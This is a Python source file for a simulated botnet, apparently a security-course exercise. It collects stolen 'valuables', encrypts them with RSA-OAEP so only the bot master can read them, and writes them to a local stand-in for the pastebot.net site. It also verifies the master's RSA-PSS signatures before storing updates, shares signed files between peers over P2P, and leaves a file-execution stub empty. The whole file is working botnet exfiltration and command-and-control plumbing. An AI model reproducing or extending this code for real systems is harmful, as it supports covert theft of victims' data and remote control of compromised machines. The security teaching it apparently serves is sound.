import os
from Crypto.Signature import PKCS1_PSS
from Crypto.Hash import SHA256
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
filestore = {}
valuables = []
from colorama import Fore, Style, init
init(convert=True)

def save_valuable(data): #Save data
    valuables.append(data)

def encrypt_for_master(data): # Encrypt the file so it can only be read by the bot master
    h=SHA256.new(data)
    with open("master_public_key",'rb') as fi:
        key = RSA.importKey(fi.read())
    cipher = PKCS1_OAEP.new(key) #Please make sure the plaintext is not too long. 
    # We are using RSA 2048 and SHA-256, the longest message we can encrypt is 190 bytes long.
    ciphertext = cipher.encrypt(data+h.digest())
    return ciphertext

def upload_valuables_to_pastebot(fn): #Upload file to pastebot.net in our local repository
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "utf-8")
    encrypted_master = encrypt_for_master(valuable_data)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()
    print(Fore.GREEN +"[+] Saved valuables to pastebot.net/%s for the botnet master\n" % fn +Style.RESET_ALL)

def verify_file(f): # Verify the file was sent by the bot master
    signature = f[:256] #Signature size is 256 bytes, Silly me
    message = f[256:]
    with open("master_public_key",'rb') as fi:
        key = RSA.importKey(fi.read())    
    h = SHA256.new()
    h.update(message)
    verifier = PKCS1_PSS.new(key)    
    if verifier.verify(h, signature): #verify the signature
        return True
    return False

def process_file(fn, f): #Check if the file was signed or not
    if verify_file(f):
        filestore[fn] = f # This ensures that only signed updates from botmaster are shared over p2p
        print(Fore.GREEN +"[+] Signature Verified. Stored the received file as " + str(fn) + "\n" +Style.RESET_ALL)
    else:
        print(Fore.RED +"[-] The file has not been signed by the botnet master\n" + Style.RESET_ALL)

def download_from_pastebot(fn): #Download file from pastebot.net in our local repository
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print(Fore.RED +"[-] The given file doesn't exist on pastebot.net\n" + Style.RESET_ALL)
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f)

def p2p_download_file(sconn): #Peer to peer download file
    fn = str(sconn.recv(), "utf-8")
    f = sconn.recv()
    print(Fore.GREEN + "[+] Receiving  " + str(fn) + " via P2P" + Style.RESET_ALL)
    process_file(fn, f)

def p2p_upload_file(sconn, fn): #Peer to peer upload file
    if fn not in filestore: # For only signed files
        print(Fore.RED +"[-] That file doesn't exist in the botnet's filestore\n"+ Style.RESET_ALL)
        return
    print(Fore.GREEN +"[+] Sending %s via P2P\n" % fn + Style.RESET_ALL)
    sconn.send(bytes(fn, 'utf-8'))
    sconn.send(bytes(filestore[fn]))

def run_file(f): #Try and run the file
    pass
